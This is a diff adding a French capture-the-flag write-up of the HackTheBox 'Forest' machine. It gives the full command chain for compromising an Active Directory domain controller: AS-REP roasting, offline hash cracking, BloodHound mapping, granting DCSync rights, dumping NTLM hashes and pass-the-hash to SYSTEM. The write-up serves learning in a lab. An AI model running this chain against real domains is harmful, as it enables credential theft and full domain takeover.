@@ -1,0 +1,76 @@
+---
+title: "HTB — Forest : Active Directory Kerberoasting"
+date: "2025-03-15"
+description: "Exploitation d'un environnement Active Directory via AS-REP Roasting, BloodHound, et abus des permissions DCSync pour compromettre le Domain Controller."
+tags: ["Active Directory", "Kerberos", "BloodHound", "Windows", "Privilege Escalation"]
+difficulty: "medium"
+platform: "HackTheBox"
+solved: true
+---
+
+## Reconnaissance
+
+On commence par un scan Nmap agressif sur les ports standards d'un DC Windows :
+```bash
+nmap -sV -sC -p 88,135,139,389,445,464,593,636,3268,3269 10.10.10.161 -oN forest.nmap
+```
+
+Le port **88 (Kerberos)** et **389 (LDAP)** confirment qu'on est face à un Domain Controller.
+Le hostname `FOREST` et le domaine `htb.local` sont visibles dans les réponses LDAP.
+
+## Énumération LDAP — Utilisateurs sans pré-auth Kerberos
+
+Avec `GetNPUsers.py` d'Impacket, on cherche les comptes vulnérables à l'**AS-REP Roasting** :
+```bash
+python3 GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
+```
+
+Bingo — le compte `svc-alfresco` répond sans pré-authentification.
+On récupère un hash AS-REP à cracker hors-ligne.
+
+## Cracking du hash avec Hashcat
+```bash
+hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+Résultat : `svc-alfresco : s3rvice`
+
+## BloodHound — Cartographie des chemins d'attaque
+```bash
+bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -dc FOREST.htb.local -c All
+```
+
+BloodHound révèle que `svc-alfresco` est membre du groupe `Account Operators`,
+qui a des droits **GenericAll** sur le groupe `Exchange Windows Permissions`,
+lui-même porteur de droits **WriteDacl** sur le domaine.
+
+## Escalade → DCSync
+
+On crée un utilisateur, on l'ajoute au groupe stratégique, et on abuse de WriteDacl
+pour s'octroyer les droits **DS-Replication-Get-Changes** :
+```python
+# Avec PowerView ou aclpwn.py
+Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" \
+  -PrincipalIdentity pwned_user \
+  -Rights DCSync
+```
+
+Puis on dump les hashes NTLM avec secretsdump :
+```bash
+python3 secretsdump.py htb.local/pwned_user:Password123@10.10.10.161
+```
+
+## Root
+
+Le hash NTLM de l'administrateur récupéré, on passe-the-hash :
+```bash
+python3 psexec.py -hashes :NTLM_HASH administrator@10.10.10.161
+```
+
+`whoami` → `nt authority\system` ✓
+
+## Leçons retenues
+
+- Les comptes de service sans pré-auth Kerberos sont **toujours** une cible prioritaire
+- BloodHound est indispensable — les chemins d'attaque AD sont rarement évidents
+- DCSync = game over pour le domaine, protéger WriteDacl sur la racine du domaine
